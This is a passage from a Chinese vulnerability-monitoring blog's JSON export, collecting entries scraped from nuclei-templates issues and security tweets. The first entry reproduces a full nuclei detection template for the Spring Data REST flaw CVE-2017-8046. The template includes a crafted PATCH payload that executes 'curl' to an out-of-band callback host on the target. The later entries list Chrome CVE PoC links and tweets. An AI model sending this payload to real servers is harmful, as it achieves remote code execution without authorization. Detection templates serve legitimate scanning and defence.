产品厂商： pivotal_software 产品名称： Spring Data REST 影响版本： &lt; 2.6.9, &lt; 3.0.1 搜索语法： http.title:”eureka” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/eb43700a37734f646c7c62f8c8f9275999236b5c/http%2Fcves%2F2017%2FCVE-2017-8046.yaml 类型： projectdiscovery&#x2F;nuclei-templates:github issues id: CVE-2017-8046 info: name: Spring Data REST &lt; 2.6.9 (Ingalls SR9) / 3.0.1 (Kay SR1) - PATCH Request Remote Code Execution author: domwhewell-sage severity: critical description: | Spring Data REST &lt; 2.6.9 and 3.0.1, Spring Boot &lt; 1.5.9 and 2.0 M6 contain a remote code execution caused by processing malicious PATCH requests with crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests. impact: | Malicious PATCH requests submitted to servers using Spring Data REST versions prior to 2.6.9 (Ingalls SR9), versions prior to 3.0.1 (Kay SR1) and Spring Boot versions prior to 1.5.9, 2.0 M6 can use specially crafted JSON data to run arbitrary Java code. remediation: | To remediate this vulnerability, update to Spring Data REST version 2.6.9 or later, or 3.0.1 or later, and Spring Boot version 1.5.9 or later, or 2.0 M6 or later. reference: - https://nvd.nist.gov/vuln/detail/CVE-2017-8046 - https://spring.io/security/cve-2017-8046 classification: cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2017-8046 cwe-id: CWE-20 cpe: cpe:2.3:a:pivotal_software:spring_data_rest:*:*:*:*:*:*:*:* metadata: vendor: pivotal_software product: spring_data_rest shodan-query: http.title:&quot;eureka&quot; tags: cve,cve2017,pivotal,springboot,pivotal_software flow: | http(1) for(let endpoint_urls of iterate(template.endpoints))&#123; set(&quot;endpoints&quot;, endpoint_urls) http(2) &#125; http: - method: GET path: - &quot;&#123;&#123;BaseURL&#125;&#125;&quot; redirects: true max-redirects: 3 extractors: - type: regex name: endpoints part: body group: 1 internal: true regex: - &#39;&quot;href&quot;\\s*:\\s*&quot;([^&quot;&#123;]+)&#39; - method: PATCH path: - &quot;&#123;&#123;endpoints&#125;&#125;/1&quot; headers: Content-Type: application/json-patch+json body: | [ &#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(\\&quot;curl &#123;&#123;interactsh-url&#125;&#125;\\&quot;).x&quot;, &quot;value&quot;: &quot;pwned&quot; &#125; ] matchers: - type: word part: interactsh_protocol words: - dns```","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"远程代码执行","slug":"远程代码执行","permalink":"http://example.com/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2017-8046","slug":"CVE-2017-8046","permalink":"http://example.com/tags/CVE-2017-8046/"}]},{"title":"Google Chrome Heap Buffer Overflow Vulnerability","slug":"github_3032523810","date":"2025-06-01T13:15:15.068Z","updated":"2025-06-01T13:15:15.067Z","comments":true,"path":"2025/06/01/github_3032523810/","permalink":"http://example.com/2025/06/01/github_3032523810/","excerpt":"","text":"漏洞名称： Google Chrome Heap Buffer Overflow Vulnerability 漏洞编号： CVE： CVE-2020-15999 漏洞类型： 缓冲区溢出 漏洞等级： 严重 漏洞描述： Google Chrome 86.0.4240.111之前的版本中存在一个堆缓冲区溢出漏洞，该漏洞由Freetype中的堆损坏引起，远程攻击者可能通过精心制作的HTML执行任意代码，利用此漏洞需要访问恶意网页。 产品厂商： Google 产品名称： Google Chrome 影响版本： version &lt; 86.0.4240.111 搜索语法： cpe:”cpe:2.3:o:debian:debian_linux” 来源： https://github.com/projectdiscovery/nuclei-templates/issues/12217 类型： projectdiscovery&#x2F;nuclei-templates:github issues 123456789101112131415161718192021222324### Description: &gt; Google Chrome &lt; 86.0.4240.111 contains a heap buffer overflow caused by heap corruption in Freetype, letting remote attackers potentially execute arbitrary code via crafted HTML, exploit requires visiting malicious webpage.#### Severity: `Critical`#### POC: - https://crbug.com/1139963- https://googleprojectzero.blogspot.com/p/rca-cve-2020-15999.html- https://vulncheck.com/xdb/8566ea6250e8- https://github.com/Marmeus/CVE-2020-15999- https///github.com:Marmeus/CVE-2020-15999.git- https://github.com/maarlo/CVE-2020-15999- https://github.com/oxfemale/CVE-2020-15999### KEV: True### Shodan Query: `cpe:&quot;cpe:2.3:o:debian:debian_linux&quot;`&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(`-debug`) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. &gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"CVE-2020-15999","slug":"CVE-2020-15999","permalink":"http://example.com/tags/CVE-2020-15999/"},{"name":"缓冲区溢出","slug":"缓冲区溢出","permalink":"http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"}]},{"title":"Horizon3Attack twitter update","slug":"twitter_1654937742","date":"2025-06-01T13:13:02.565Z","updated":"2025-06-01T13:13:02.561Z","comments":true,"path":"2025/06/01/twitter_1654937742/","permalink":"http://example.com/2025/06/01/twitter_1654937742/","excerpt":"","text":"博主： Horizon3Attack 推文： 看看我们对#Fortinet CVE-2025-32756的最新深度解析，这是一个典型的缓冲区溢出漏洞！该漏洞已被野外利用，并于上周被添加到CISA KEV目录中。https://t.co/HYNCsIPkMl https://t.co/2hgY6RYDRj 链接： https://x.com/Horizon3Attack/status/1925604263557804412","categories":[{"name":"推特监控","slug":"推特监控","permalink":"http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"Horizon3Attack","slug":"Horizon3Attack","permalink":"http://example.com/tags/Horizon3Attack/"}]},{"title":"Horizon3Attack twitter update","slug":"twitter_4118876722","date":"2025-06-01T13:12:28.474Z","updated":"2025-06-01T13:12:28.468Z","comments":true,"path":"2025/06/01/twitter_4118876722/","permalink":"http://example.com/2025/06/01/twitter_4118876722/","excerpt":"","text":"博主： Horizon3Attack 推文： 我们最新的博客探讨了CVE-2025-20188，这是#Cisco IOS XE无线控制器中由于硬编码凭证导致的任意文件上传漏洞。 https://t.co/XTG5PmnoVh 链接： https://x.com/Horizon3Attack/status/1928155109994668125","categories":[{"name":"推特监控","slug":"推特监控","permalink":"http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"Horizon3Attack","slug":"Horizon3Attack","permalink":"http://example.com/tags/Horizon3Attack/"}]}],"categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"},{"name":"推特监控","slug":"推特监控","permalink":"http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2020-12641","slug":"CVE-2020-12641","permalink":"http://example.com/tags/CVE-2020-12641/"},{"name":"CVE-2017-8046","slug":"CVE-2017-8046","permalink":"http://example.com/tags/CVE-2017-8046/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"CVE-2025:github search","slug":"CVE-2025-github-search","permalink":"http://example.com/tags/CVE-2025-github-search/"},{"name":"其他","slug":"其他","permalink":"http://example.com/tags/%E5%85%B6%E4%BB%96/"},{"name":"CVE-2025-32432","slug":"CVE-2025-32432","permalink":"http://example.com/tags/CVE-2025-32432/"},{"name":"弱口令","slug":"弱口令","permalink":"http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"},{"name":"服务器端请求伪造","slug":"服务器端请求伪造","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"name":"CVE-2023:github search","slug":"CVE-2023-github-search","permalink":"http://example.com/tags/CVE-2023-github-search/"},{"name":"CVE-2023-25690","slug":"CVE-2023-25690","permalink":"http://example.com/tags/CVE-2023-25690/"},{"name":"rapid7/metasploit-framework:github issues","slug":"rapid7-metasploit-framework-github-issues","permalink":"http://example.com/tags/rapid7-metasploit-framework-github-issues/"},{"name":"CVE-2024-26809","slug":"CVE-2024-26809","permalink":"http://example.com/tags/CVE-2024-26809/"},{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"CVE-2020-13160","slug":"CVE-2020-13160","permalink":"http://example.com/tags/CVE-2020-13160/"},{"name":"CVE-2025-48827","slug":"CVE-2025-48827","permalink":"http://example.com/tags/CVE-2025-48827/"},{"name":"未授权访问","slug":"未授权访问","permalink":"http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"CVE-2025-3248","slug":"CVE-2025-3248","permalink":"http://example.com/tags/CVE-2025-3248/"},{"name":"配置问题","slug":"配置问题","permalink":"http://example.com/tags/%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"},{"name":"CVE-2020-0646","slug":"CVE-2020-0646","permalink":"http://example.com/tags/CVE-2020-0646/"},{"name":"CVE-2024:github search","slug":"CVE-2024-github-search","permalink":"http://example.com/tags/CVE-2024-github-search/"},{"name":"CVE-2024-9264","slug":"CVE-2024-9264","permalink":"http://example.com/tags/CVE-2024-9264/"},{"name":"CVE-2025-27590","slug":"CVE-2025-27590","permalink":"http://example.com/tags/CVE-2025-27590/"},{"name":"远程代码执行","slug":"远程代码执行","permalink":"http://example.com/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2020-15999","slug":"CVE-2020-15999","permalink":"http://example.com/tags/CVE-2020-15999/"},{"name":"缓冲区溢出","slug":"缓冲区溢出","permalink":"http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"},{"name":"Horizon3Attack","slug":"Horizon3Attack","permalink":"http://example.com/tags/Horizon3Attack/"}]}